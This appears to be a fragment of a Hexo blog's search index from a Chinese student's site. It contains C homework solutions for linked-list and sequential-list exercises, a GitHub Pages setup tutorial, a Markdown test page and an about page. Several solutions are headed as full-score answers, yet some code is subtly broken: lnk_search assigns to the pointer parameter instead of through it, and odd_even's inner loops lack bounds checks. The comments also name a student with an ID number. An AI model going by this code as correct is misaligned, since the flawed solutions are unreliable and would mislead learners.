class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-03, Tue, 18:32:04</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void odd_even(SeqList* L)</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; 0;</span><br><span class="line">    int j &#x3D; L-&gt;last;</span><br><span class="line">    while (i &lt; j) &#123;</span><br><span class="line">        while (L-&gt;elem[i] % 2 !&#x3D; 0)</span><br><span class="line">            i++;</span><br><span class="line">        while (L-&gt;elem[j] % 2 &#x3D;&#x3D; 0)</span><br><span class="line">            j--;</span><br><span class="line">        if (i &lt; j) &#123;</span><br><span class="line">            int t &#x3D; L-&gt;elem[i];</span><br><span class="line">            L-&gt;elem[i] &#x3D; L-&gt;elem[j];</span><br><span class="line">            L-&gt;elem[j] &#x3D; t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h1 id="T4"><a href="#T4" class="headerlink" title="T4"></a>T4</h1><ol><li><p>链表 删除范围内结点<br>已知线性表中的元素（整数）以值递增有序排列，并以单链表作存储结构。试写一高效算法，删除表中所有大于mink且小于maxk的元素（若表中存在这样的元素），分析你的算法的时间复杂度。<br>链表结点定义如下：</p><blockquote><p>struct _lnklist{</p><pre><code>ElemType data;struct _lnklist *next;</code></pre><p>};<br>typedef struct _lnklist Node;<br>typedef struct _lnklist *LinkList;<br>函数原型如下：<br>void lnk_del_x2y(LinkList L, ElemType mink, ElemType maxk)<br>其中L指向链表的头结点。</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-13, Fri, 18:35:51</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void lnk_del_x2y(LinkList L, ElemType mink, ElemType maxk)</span><br><span class="line">&#123;</span><br><span class="line">    LinkList p, q, prev &#x3D; NULL;</span><br><span class="line">    if (mink &gt; maxk)</span><br><span class="line">        return;</span><br><span class="line">    p &#x3D; L;</span><br><span class="line">    prev &#x3D; p;</span><br><span class="line">    p &#x3D; p-&gt;next;</span><br><span class="line">    while (p &amp;&amp; p-&gt;data &lt; maxk) &#123;</span><br><span class="line">        if (p-&gt;data &lt;&#x3D; mink) &#123;</span><br><span class="line">            prev &#x3D; p;</span><br><span class="line">            p &#x3D; p-&gt;next;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            prev-&gt;next &#x3D; p-&gt;next;</span><br><span class="line">            q &#x3D; p;</span><br><span class="line">            p &#x3D; p-&gt;next;</span><br><span class="line">            free(q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T5"><a href="#T5" class="headerlink" title="T5"></a>T5</h1><ol><li><p>链表 倒数查找<br>已知一个带有表头结点的单链表, 假设链表只给出了头指针L。在不改变链表的前提下，请设计一个尽可能高效的算法，查找链表中倒数第k个位置上的结点（k为正整数）。<br>函数原型为：</p><blockquote><p>int lnk_search(LinkList L, int k, ElemType* p_ele)<br>若查找成功，函数通过指针参数 p_ele 返回该结点 data 域的值，此时函数返回 1；否则，函数返回 0。相关定义如下：<br>struct _lnklist{</p><pre><code>ElemType data;struct _lnklist *next;</code></pre><p>};<br>typedef struct _lnklist Node;<br>typedef struct _lnklist *LinkList;</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-13, Fri, 18:40:21</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int lnk_search(LinkList L, int k, ElemType* p_ele)</span><br><span class="line">&#123;</span><br><span class="line">    LinkList p &#x3D; L-&gt;next, q &#x3D; L-&gt;next;</span><br><span class="line">    int count &#x3D; 0;</span><br><span class="line">    while (p !&#x3D; NULL) &#123;</span><br><span class="line">        if (count &lt; k)</span><br><span class="line">            count++;</span><br><span class="line">        else</span><br><span class="line">            q &#x3D; q-&gt;next;</span><br><span class="line">        p &#x3D; p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    if (count &lt; k)</span><br><span class="line">        return 0;</span><br><span class="line">    else &#123;</span><br><span class="line">        p_ele &#x3D; q-&gt;data;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T6"><a href="#T6" class="headerlink" title="T6"></a>T6</h1><ol><li><p>链表 合并<br>设线性表A=(a1, a2,…,am)，B=(b1, b2,…,bn)，试写一个按下列规则合并A、B为线性表C的算法，使得：<br>C= (a1, b1,…,am, bm, bm+1, …,bn) 当m≤n时；<br>或者<br>C= (a1, b1,…,an, bn, an+1, …,am) 当m&gt;n时。<br>线性表A、B、C均以单链表作为存储结构，且C表利用A表和B表中的结点空间构成。注意：单链表的长度值m和n均未显式存储。<br>函数的原型如下：</p><blockquote><p>void lnk_merge(LinkList A, LinkList B, LinkList C)<br>即将A和B合并为C，其中 C 已经被初始化为空单链表<br>相关定义如下：<br>struct _lnklist{</p><pre><code>ElemType data;struct _lnklist *next;</code></pre><p>};<br>typedef struct _lnklist Node;<br>typedef struct _lnklist *LinkList;</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-03-21, Sat, 12:38:40</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void lnk_merge(LinkList A, LinkList B, LinkList C)</span><br><span class="line">&#123;</span><br><span class="line">    Node *p, *q, *m, *temp;</span><br><span class="line">    p &#x3D; A-&gt;next;</span><br><span class="line">    q &#x3D; B-&gt;next;</span><br><span class="line">    m &#x3D; C;</span><br><span class="line">    while (p !&#x3D; NULL &amp;&amp; q !&#x3D; NULL) &#123;</span><br><span class="line">        m-&gt;next &#x3D; p;</span><br><span class="line">        temp &#x3D; p-&gt;next;</span><br><span class="line">        p-&gt;next &#x3D; q;</span><br><span class="line">        m &#x3D; q;</span><br><span class="line">        p &#x3D; temp;</span><br><span class="line">        q &#x3D; q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    if (p !&#x3D; NULL) &#123;</span><br><span class="line">        m-&gt;next &#x3D; p;</span><br><span class="line">    &#125;</span><br><span class="line">    if (q !&#x3D; NULL) &#123;</span><br><span class="line">        m-&gt;next &#x3D; q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 线性表 </tag>
            
            <tag> 链表 </tag>
            
            <tag> 顺序表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用githubPages架构简单的静态网页</title>
      <link href="/post/34560.html"/>
      <url>/post/34560.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Github账号的注册"><a href="#Github账号的注册" class="headerlink" title="Github账号的注册"></a>Github账号的注册</h1><ol><li><p>首先在<a href="https://github.com" target="_blank" rel="noopener">GitHub</a>注册一个GitHub账号，并在你的Github Repositories下新建一个名为YourName.github.io的仓库。</p></li><li><p>所有选项按照默认配置就行。</p><blockquote><p>值得注意的是，GitHub平台是全英文的，因此具备一定的英语水平还是必要的</p></blockquote></li><li><p>其次，下载<a href="https://git-scm.com" target="_blank" rel="noopener">Git</a>并安装，所有选项按照默认配置即可</p><blockquote><p>Git的所有操作一般都在Gi bash控制台界面进行，因此学习掌握Git的使用是十分必要的</p></blockquote></li><li><p>打开Git Bash控制台，使用git config –global user.name指令生命本机用户名，之后使用git config –global user.email指令声明本机用户名对应的邮箱地址。再使用ssh-keygen -t rsa -C <a href="mailto:email@email.com">email@email.com</a>指令生成新的ssh公钥</p></li><li><p>使用cd指令选择一个合适的路径存放你的本地仓库，使用mkdir指令建立一个由你自由命名的文件夹。</p><blockquote><p>Linux指令： cd——用于切换所在目录<br>Linux指令: mkdir——用于新建文件/文件夹</p></blockquote></li><li><p>使用git init指令对本地仓库进行初始化。至此，你的一个本地仓库已经架构完成！</p><blockquote><p>Git指令： git init——用于在一个空的位置进行Git的初始化</p></blockquote></li></ol><hr><h1 id="本地仓库与Github-Repositories-建立连接"><a href="#本地仓库与Github-Repositories-建立连接" class="headerlink" title="本地仓库与Github Repositories 建立连接"></a>本地仓库与Github Repositories 建立连接</h1><ol><li>在GitHub的Settings中找到SSH and GPG keys并且选择New SSH key，找到你的电脑中.ssh文件夹中的公钥文件id_rsa.pub，并将其中的内容复制到网页相应位置，配置成功之后保存即可。</li><li>使用ssh -T <a href="mailto:git@github.com">git@github.com</a>测试连接是否成功<blockquote><p>Git指令： ssh -T <a href="mailto:git@github.com">git@github.com</a>——用于测试本地仓库与远程仓库之间是否成功连接</p></blockquote></li><li>连接测试成功之后找到网页上你的相应仓库，在Clone or Download中选择Clone with Https，复制URL。回到Git Bash控制台，使用git remote add origin [你刚刚复制的URL] 指令进行远程连接<blockquote><p>Git指令： git remote add origin [URL]——连接本地仓库到指定的远程库</p></blockquote></li><li>连接成功之后，你就可以将本地仓库的内容远程push到GitHub仓库中去了。<blockquote><p>Git指令： git push——将本地仓库的内容推送到远程库中</p><blockquote><p>Git push的一般步骤：</p><pre><code>1. git add .2. git status3. git commit -m &quot;备注内容&quot;4. git push</code></pre></blockquote></blockquote></li></ol><h1 id="启用Github-Pages功能"><a href="#启用Github-Pages功能" class="headerlink" title="启用Github Pages功能"></a>启用Github Pages功能</h1><ol><li>将你的仓库名称修改为YourName.github.io</li><li>在你的Repositories的Settings中找到GitHub Pages选项，将Source改为master branch后保存。</li></ol><h1 id="搭建一个静态网页"><a href="#搭建一个静态网页" class="headerlink" title="搭建一个静态网页"></a>搭建一个静态网页</h1><ol><li>一般的，我们从搭建静态网页开始。在本地仓库中建立index.html作为主界面文件。打开index.html</li><li>键入<p>Hello World!</p>并保存。</li><li>在你的本地仓库的文件夹内用鼠标右键单击Git Bash Here唤起Git Bash控制台，使用git add .指令将所有的文件提交到缓存区，使用git status命令查看文件状态，确认无误后，使用git commit -m “你想要留下的备注”提交更改，之后用git push命令将所有的更改上传到GitHub的远程仓库中。<blockquote><p>Git push的全套流程参见上文</p></blockquote></li><li>至此，一个最简单的静态网页就被成功搭建了。你可以通过YourName.github.io这个网址来访问你的个人网站。</li></ol><h1 id="将GitHub-Pages架构的网站解析到自己的域名"><a href="#将GitHub-Pages架构的网站解析到自己的域名" class="headerlink" title="将GitHub Pages架构的网站解析到自己的域名"></a>将GitHub Pages架构的网站解析到自己的域名</h1><ol><li>你需要购买一个域名的使用期限。本文以在腾讯云平台购买域名为例</li><li>在腾讯云官网上进行注册和实名认证，依靠后缀找到合适的域名，并且确认其是否可用。在付款之后即可使用。<blockquote><p>一个教训：选择域名后缀的时候不要贪图便宜或者过于追求新意。笔者的以.space为后缀的域名目前面临着无法进行公安备案的尴尬处境</p></blockquote></li><li>两种解析方式<ul><li>在腾讯域名管理界面选择解析，利用电脑自带的CMD或者PowerShell控制台，输入Ping YourName.github.io来确认IP地址，直接解析该IP地址，添加到解析记录中。</li><li>或者在解析时选择CNAME方式，在后面可以直接解析githubpages网址（就是YourName.github.io）</li></ul></li><li>解析记录添加成功之后即可直接从该域名访问个人网站。</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> Github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
            <tag> 静态网页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test01</title>
      <link href="/post/63177.html"/>
      <url>/post/63177.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="这是一个测试页面"><a href="#这是一个测试页面" class="headerlink" title="这是一个测试页面"></a>这是一个测试页面</h1><h2 id="测试开始于2020-02-10"><a href="#测试开始于2020-02-10" class="headerlink" title="测试开始于2020-02-10"></a>测试开始于2020-02-10</h2><h3 id="正在测试多级标题的完整性"><a href="#正在测试多级标题的完整性" class="headerlink" title="正在测试多级标题的完整性"></a>正在测试多级标题的完整性</h3><h4 id="这是第四级标题"><a href="#这是第四级标题" class="headerlink" title="这是第四级标题"></a>这是第四级标题</h4><h5 id="这是第五级标题"><a href="#这是第五级标题" class="headerlink" title="这是第五级标题"></a>这是第五级标题</h5><h6 id="这是第六级标题"><a href="#这是第六级标题" class="headerlink" title="这是第六级标题"></a>这是第六级标题</h6><pre><code>测试</code></pre><p>1234567890<br>    测试</p><ul><li>测试01</li><li>测试02</li><li>测试03</li></ul><ol start="4"><li>测试04</li><li>测试05</li><li>测试06</li></ol><p>【外链文本测试】（<a href="http://www.xinhuanet.com//politics/2020-02/10/c_1125555826.htm）" target="_blank" rel="noopener">http://www.xinhuanet.com//politics/2020-02/10/c_1125555826.htm）</a></p><p>【外链图片测试】<br>！【avatar】（<a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/avatar.png）" target="_blank" rel="noopener">https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/avatar.png）</a></p><h1 id="引用测试"><a href="#引用测试" class="headerlink" title="引用测试"></a>引用测试</h1><blockquote><p>夕阳像一只狐狸悄悄穿过这片土地，转瞬间点燃荒草。——果戈里</p></blockquote><p><em>夕阳</em>像一只<strong>狐狸</strong>悄悄<em>穿过</em>这片<strong>土地</strong>，<code>转瞬间点燃荒草</code></p><h1 id="代码插入测试"><a href="#代码插入测试" class="headerlink" title="代码插入测试"></a>代码插入测试</h1><p><code>printf(&quot;Hello,World!&quot;);</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include&lt;stdio.h&gt;</span><br><span class="line">include&lt;stdlib.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int a,b;</span><br><span class="line">    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span><br><span class="line">    printf(&quot;Sum &#x3D; %d&quot;,a+b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="表格插入测试"><a href="#表格插入测试" class="headerlink" title="表格插入测试"></a>表格插入测试</h1><table><thead><tr><th>Tables</th><th align="center">Are</th><th align="right">Cool</th></tr></thead><tbody><tr><td>col 3 is</td><td align="center">right-aligned</td><td align="right">$1600</td></tr><tr><td>col 2 is</td><td align="center">centered</td><td align="right">$12</td></tr><tr><td>zebra stripes</td><td align="center">are neat</td><td align="right">$1</td></tr></tbody></table><h1 id="图片测试2"><a href="#图片测试2" class="headerlink" title="图片测试2"></a>图片测试2</h1><p>![][1]<br>[1]:<a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BlueChip_ZH-CN7376022522_1920x1080.jpg" target="_blank" rel="noopener">https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BlueChip_ZH-CN7376022522_1920x1080.jpg</a></p><h1 id="初次测试结束"><a href="#初次测试结束" class="headerlink" title="初次测试结束"></a>初次测试结束</h1><h3 id="2020-02-10"><a href="#2020-02-10" class="headerlink" title="2020-02-10"></a>2020-02-10</h3>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/post/16107.html"/>
      <url>/post/16107.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>lab</title>
      <link href="/Lab/index.html"/>
      <url>/Lab/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">本页面用于实验各种未发布&#x2F;正式部署的插件&#x2F;应用程序&#x2F;架构等，不保证其鲁棒性！</span><br><span class="line">进入此页面请谨慎使用各项功能，以免造成包括但不限于死机，卡退等后果</span><br></pre></td></tr></table></figure></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于自己</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul><li>他是一个曾经高唱着“青霄有路终须到，金榜无名誓不归”的少年</li><li>他热爱生活，热爱周遭的一切，想要亲自去探索他所存在的的世界</li><li>他热爱计算机，热爱编程。与代码相处让他感到由衷的快乐</li><li>“须知少时凌云志，曾许人间第一流”</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Name: Cosmos</span><br><span class="line">Age: 18</span><br><span class="line">Gender: male</span><br><span class="line">Address: ChengDu</span><br><span class="line">Github: https:&#x2F;&#x2F;github.com&#x2F;cosmos-UESTC</span><br><span class="line">Blog: https:&#x2F;&#x2F;fengxinyue.cn&#x2F;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">“疏影横斜水清浅，暗香浮动月黄昏”</span><br><span class="line"></span><br><span class="line">于2020-02-10 夜</span><br></pre></td></tr></table></figure></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>live2d</title>
      <link href="/live2d/index.html"/>
      <url>/live2d/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本版面用于测试开发中的Live2d模组在Butterfly主题中的应用，目前没有具体的实验方法以及具体步骤</span><br><span class="line">故无法保证实验的有效性和系统的鲁棒性！</span><br></pre></td></tr></table></figure></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/Lab/index.html"/>
      <url>/Lab/index.html</url>
      
